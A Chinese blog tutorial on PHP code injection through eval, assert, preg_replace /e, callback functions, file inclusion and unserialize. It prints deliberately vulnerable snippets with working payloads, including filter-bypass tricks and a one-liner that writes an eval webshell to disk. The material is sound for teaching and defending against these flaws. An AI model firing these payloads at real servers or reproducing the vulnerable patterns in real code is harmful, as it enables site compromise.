---
title: PHP代码注入和命令注入
date: 2017-04-18 09:16:10
categories: Web安全
tags:
    - PHP
    - 代码注入
    - 命令注入
---

## 代码注入和命令注入

代码注入攻击通常是指：用户输入未作严格过滤，导致提交的内容传入某些函数会被当做`PHP代码`执行,而命令注入攻击通常是指：用户输入未作严格过滤，导致提交的内容传入某些函数会被当做`系统命令`执行。
可以看出代码注入攻击和命令注入攻击是类似的，不同点在于，代码注入攻击要实现的功能限制在注入的语言本身，而命令注入是利用已有的系统命令，通常受shell限制。

<!-- more -->

## 代码注入攻击

代码注入攻击一般出现在不安全的使用某些函数，文件包含导致代码注入攻击，反序列化导致的代码注入攻击。

### 常见的相关函数

代码执行函数有: `eval`, `assert`, 正则匹配函数:`preg_replace`, 动态代码执行函数: `create_function`, `call_user_func`, `call_user_func_array`。

* eval

```php
# 1. 没有任何过滤
<?php
@eval($_GET["cmd"]);
?>

?cmd=phpinfo();
?cmd=fputs(fopen('test.php','w'),'<?php @eval($_POST[test])?>')

# 2. addslashes 过滤
<?php
$cmd = @(string)$_GET["cmd"];
eval('$cmd="' . addslashes($cmd) . '";');
?>

# ${${}} 绕过
cmd=${${phpinfo()}}

# 3 双引号包含过滤
<?php
$cmd = "echo \"hello " . $_GET['cmd'] . "\";";
eval($cmd);

# ${${}} 绕过
cmd=${${phpinfo()}}
```

`${${}} 绕过`是利用可变变量的二次嵌套，执行里面花括号内的代码，如: `echo "${${phpinfo()}}";`, 会执行phpinfo(), 这里必须是双引号包含，双引号包含时会解析包含的字符串中的变量。

PHP可变变量可以无需二次嵌套，一次也可以执行，`echo "${phpinfo()}";`这种情况是不能执行的，而`echo "${/**/phpinfo()}";`是能执行phpinfo()的, 这是因为花括号解析语法的关键条件是花括号内的第一个字符，`空格，tab，注释，回车`是各种语法分析引擎中常见的分割字符，`@`是PHP语法的一个特殊的容错符号，所以可变变量内的花括号有这么一个规则，需要判断花括号内的内容是否为真正的代码，条件即是文本的第一个字符串是否为PHP语法解析引擎的分割字符和特殊的语法符号, 因此下面代码都能执行。

```php

```

** php >= 4.3 **

```php
"${ phpinfo()}";
"${    phpinfo()}";
"${/**/phpinfo()}";
"${
phpinfo()}";
"${@phpinfo()}";

"${( string )phpinfo()}";
"${phpinfo[phpinfo()]}";

"{$phpinfo[phpinfo()]}";
"{${phpinfo()}}";
"${${phpinfo()}}";
```

** 更新：php>=5.5 **

```php
"${phpinfo()}";
```
执行phpinfo().

* assert

```php
<?php
@assert($_GET["cmd"]);
?>
cmd=phpinfo();
```

#### preg_replace

preg_replace()函数可以引发代码执行，源于PCRE (Perl Compatible Regular Expressions) 中的e(PREG_REPLACE_EVAL)选项，
这个选项会把replacement中的内容当做PHP代码执行，并取返回结果的值，其中后项引用可以是`$1`，也可以是`\\1`。
当replacement 参数构成一个合理的php 代码字符串的时候，`/e` 修正符使preg_replace()，将replacement 参数当做php 代码执行。

* 第一个参数 pattern的代码注入

```php
# magic_quotes_gpc=Off时，导致代码执行。
<?php
$regexp = $_GET['reg'];
$var = '<php>phpinfo()</php>';
preg_replace("/<php>(.*?)$regexp", '\\1', $var);
?>
```
提交：`reg=%3C\/php%3E/e`, 执行 phpinfo(), 即pattern参数注入`/e`修正符。

一般情况是不会有`e`选项的，我们可以通过`%00`截断等方式来添加

```php
<?php  
$regexp = $_GET['re'];  
$var = '<tag>phpinfo()</tag>';  
preg_replace("/<tag>(.*?)$regexp<\/tag>/", '\\1', $var);  
?>  
```
提交：`reg=%3C\/php%3E/e%00`.

* 第二个参数replacement

```
# /e 修正符使preg_replace()，将replacement 参数当做php 代码执行
<?php
preg_replace("//e", $_GET['cmd'], "cmd test");
?>
```
提交:`cmd=phpinfo()`

*  第三个参数

```php
<?
preg_replace("/\s*\[php\](.+?)\[\/php\]\s*/ies", "\\1", $_GET['h']);
?>
```

提交：`h=[php]phpinfo()[/php]`。

#### 其他函数

* array_map

```php
<?php
$evil_callback = $_GET['callback'];
$some_array = array(0, 1, 2, 3);
$new_array = array_map($evil_callback, $some_array);
?>
```

提交 `http://127.0.0.1/array_map.php?callback=phpinfo`, 即执行`phpinfo()`

```php
array_map()
usort(), uasort(), uksort()
array_filter()
array_reduce()
array_diff_uassoc(), array_diff_ukey()
array_udiff(), array_udiff_assoc(), array_udiff_uassoc()
array_intersect_assoc(), array_intersect_uassoc()
array_uintersect(), array_uintersect_assoc(), array_uintersect_uassoc()
array_walk(), array_walk_recursive()
xml_set_character_data_handler()
xml_set_default_handler()
xml_set_element_handler()
xml_set_end_namespace_decl_handler()
xml_set_external_entity_ref_handler()
xml_set_notation_decl_handler()
xml_set_processing_instruction_handler()
xml_set_start_namespace_decl_handler()
xml_set_unparsed_entity_decl_handler()
stream_filter_register()
set_error_handler()
register_shutdown_function()
register_tick_function()
```

### 文件包含导致代码注入攻击

PHP文件包含会执行包含文件的代码，当开启了远程文件包含，则非常容易引起代码注入攻击。远程文件包含条件: `allow_url_fopen=On`, `allow_url_include=On`, 文件包含相关函数有: `include`, `include_once`, `require`, `require_once`。

```php
<?php
include($_GET['cmd']);
?>
```

提交：`cmd=data:text/plain,%3C?php%20phpinfo%28%29;?%3E`, 即执行phpinfo()。

### 反序列化导致的代码注入攻击

```php
<?php
class Example {
    var $var = '';
    function __destruct() {
        eval($this->var);
    }
}

unserialize($_GET['saved_code']);
?>
```
提交: `unserialize.php?saved_code=O:7:%22Example%22:1:{s:3:%22var%22;s:10:%22phpinfo%28%29;%22;}`,即执行phpinfo()

#### 绕过方法

有一些程序中会判断用户输入是不是一个序列化的数据，常见的代码如下
```php
$token = $data[0];  
switch ( $token ) {  
    case 's' :  
        if ( '"' !== $data[$length-2] )  
            return false;  
    case 'a' :  
    case 'O' :  
        return (bool) preg_match( "/^{$token}:[0-9]+:/s", $data );  
    case 'b' :  
    case 'i' :  
    case 'd' :  
        return (bool) preg_match( "/^{$token}:[0-9.E-]+;\$/", $data );  
```
这个可以用+来绕过，这也属于PHP的一种特性: `O:+4:"test":1:{s:1:"a";s:3:"aaa";}`
